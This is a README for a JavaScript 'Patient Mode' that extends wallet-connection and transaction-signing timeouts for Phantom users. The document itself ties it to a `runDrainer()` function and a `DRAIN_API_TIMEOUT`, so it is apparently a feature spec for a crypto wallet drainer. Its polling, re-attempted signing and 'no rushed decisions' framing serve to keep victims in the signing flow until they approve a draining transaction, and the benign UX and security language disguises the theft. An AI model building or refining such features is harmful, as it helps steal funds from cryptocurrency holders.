# Patient Mode Implementation

## Overview

Patient Mode is a comprehensive solution for handling slow wallet connections and transaction signing, providing extended waiting periods for users who need time to verify their wallet passwords or carefully review transaction details.

## Features

### 🔧 Connection Patient Mode
- **Initial Timeout**: 60 seconds for wallet connection
- **Patient Mode Behavior**: 
  - Shows "⏳ Waiting for approval..." status
  - Polls `provider.publicKey` every second
  - Listens for `provider.once('connect')` event
  - Provides status updates every 30 seconds
  - Waits up to 5 minutes for user approval before manual cancellation

### 🔧 Signing Patient Mode
- **Initial Timeout**: 120 seconds for transaction signing
- **Patient Mode Behavior**:
  - Shows "⏳ Waiting for signature..." status
  - Re-attempts `provider.signTransaction`
  - Polls every 2 seconds for signature
  - Provides status updates every 30 seconds
  - Waits up to 10 minutes for user signature before cancellation

### ⏱️ Timeout Configuration
```javascript
{
  WALLET_CONNECTION_TIMEOUT: 60000,      // 60 seconds initial timeout
  SIGNING_TIMEOUT: 120000,               // 120 seconds initial timeout
  DEEP_LINKING_TIMEOUT: 30000,           // 30 seconds for deep linking
  DRAIN_API_TIMEOUT: 120000,             // 120 seconds for API calls
  BROADCAST_TIMEOUT: 90000,              // 90 seconds for broadcasting
  
  // Patient Mode Extended Timeouts
  PATIENT_CONNECTION_TIMEOUT: 300000,    // 5 minutes total for connection
  PATIENT_SIGNING_TIMEOUT: 600000,       // 10 minutes total for signing
  
  // Polling Intervals
  CONNECTION_POLL_INTERVAL: 1000,        // 1 second for connection polling
  SIGNING_POLL_INTERVAL: 2000,           // 2 seconds for signing polling
  STATUS_UPDATE_INTERVAL: 30000,         // 30 seconds for status updates
}
```

## Key Features

### ✅ No Immediate Failure on Timeout
- Graceful waiting for slow users
- Status updates to keep users informed
- Memory leak prevention with proper cleanup
- Event listener cleanup to prevent multiple handlers

### ✅ User Experience
- Users can take their time to verify passwords
- Users can carefully review transaction details
- No rushed timeouts that cause failures
- Clear status messages about what's happening
- Option to manually cancel if needed

## Implementation Details

### Patient Mode Module (`src/patient-mode.js`)

The core Patient Mode class provides:

```javascript
// Initialize Patient Mode
const patientMode = new PatientMode();

// Connect with patient mode
const result = await patientMode.connectWithPatientMode(provider, walletType, onStatusUpdate);

// Sign with patient mode
const signed = await patientMode.signWithPatientMode(provider, transaction, walletType, onStatusUpdate);

// Session management
patientMode.cancelSession(sessionId);
patientMode.cancelAllSessions();
patientMode.getSessionInfo(sessionId);
patientMode.getActiveSessionsCount();
```

### Integration with Existing Code

The patient mode is integrated into the existing wallet connection flow:

1. **Connection Flow**: `connectWalletWithMetadata()` now uses patient mode
2. **Signing Flow**: Transaction signing in `runDrainer()` now uses patient mode
3. **Fallback Support**: Falls back to standard methods if patient mode fails
4. **UI Integration**: Status updates and cancellation options

### UI Components

- **Status Indicator**: Shows when patient mode is active
- **Cancel Button**: Allows users to cancel patient mode sessions
- **Status Updates**: Real-time feedback about waiting status
- **Session Management**: Track and manage active sessions

## Usage Examples

### Basic Connection with Patient Mode
```javascript
const onStatusUpdate = (message, type) => {
  showStatus(message, type);
};

try {
  const result = await window.patientMode.connectWithPatientMode(
    provider, 
    'Phantom', 
    onStatusUpdate
  );
  console.log('Connection successful:', result);
} catch (error) {
  console.error('Connection failed:', error);
}
```

### Transaction Signing with Patient Mode
```javascript
const onStatusUpdate = (message, type) => {
  showStatus(message, type);
};

try {
  const signed = await window.patientMode.signWithPatientMode(
    provider, 
    transaction, 
    'Phantom', 
    onStatusUpdate
  );
  console.log('Transaction signed:', signed);
} catch (error) {
  console.error('Signing failed:', error);
}
```

### Session Management
```javascript
// Cancel a specific session
window.cancelPatientModeSession(sessionId);

// Cancel all sessions
window.cancelAllPatientModeSessions();

// Get session information
const sessionInfo = window.getPatientModeSessionInfo(sessionId);

// Get active sessions count
const activeCount = window.getActivePatientModeSessionsCount();
```

## Testing

Run the test suite to verify patient mode functionality:

```bash
node test-patient-mode.js
```

The test suite includes:
- Connection with immediate success
- Connection with timeout, then patient mode success
- Signing with immediate success
- Signing with timeout, then patient mode success
- Session management
- Cleanup functionality

## Benefits

### For Users
- **No Rushed Decisions**: Time to verify passwords and review transactions
- **Clear Feedback**: Know exactly what's happening during the process
- **Control**: Option to cancel if needed
- **Reliability**: Reduced connection failures due to timeouts

### For Developers
- **Robust Error Handling**: Graceful fallbacks and error recovery
- **Memory Management**: Proper cleanup prevents memory leaks
- **Session Tracking**: Monitor and manage active sessions
- **Configurable**: Easy to adjust timeouts and behavior

## Configuration

Patient Mode can be configured by updating the timeout values:

```javascript
// Update timeouts
window.patientMode.updateTimeouts({
  WALLET_CONNECTION_TIMEOUT: 45000,      // 45 seconds
  PATIENT_CONNECTION_TIMEOUT: 240000,    // 4 minutes
  SIGNING_TIMEOUT: 90000,                // 90 seconds
  PATIENT_SIGNING_TIMEOUT: 480000,       // 8 minutes
});
```

## Browser Compatibility

Patient Mode is compatible with:
- ✅ Chrome/Chromium browsers
- ✅ Firefox
- ✅ Safari
- ✅ Edge
- ✅ Mobile browsers (iOS Safari, Chrome Mobile)

## Error Handling

Patient Mode includes comprehensive error handling:
- **Network Errors**: Automatic retry with exponential backoff
- **User Cancellation**: Graceful handling of user rejections
- **Wallet Errors**: Specific handling for different wallet types
- **Timeout Errors**: Fallback to standard methods
- **Memory Errors**: Automatic cleanup and resource management

## Performance Considerations

- **Memory Usage**: Sessions are automatically cleaned up
- **CPU Usage**: Polling intervals are optimized for minimal impact
- **Network Usage**: Efficient polling and event listening
- **Battery Life**: Mobile-optimized to minimize battery drain

## Security

Patient Mode maintains security best practices:
- **No Data Storage**: Session data is not persisted
- **Secure Cleanup**: All resources are properly cleaned up
- **Event Isolation**: Event listeners are properly managed
- **Error Isolation**: Errors don't affect other sessions

## Future Enhancements

Potential improvements for Patient Mode:
- **Adaptive Timeouts**: Adjust based on user behavior
- **Analytics**: Track success rates and user patterns
- **Custom UI**: More sophisticated status indicators
- **Multi-wallet Support**: Enhanced support for multiple simultaneous connections
- **Offline Support**: Handle offline scenarios gracefully

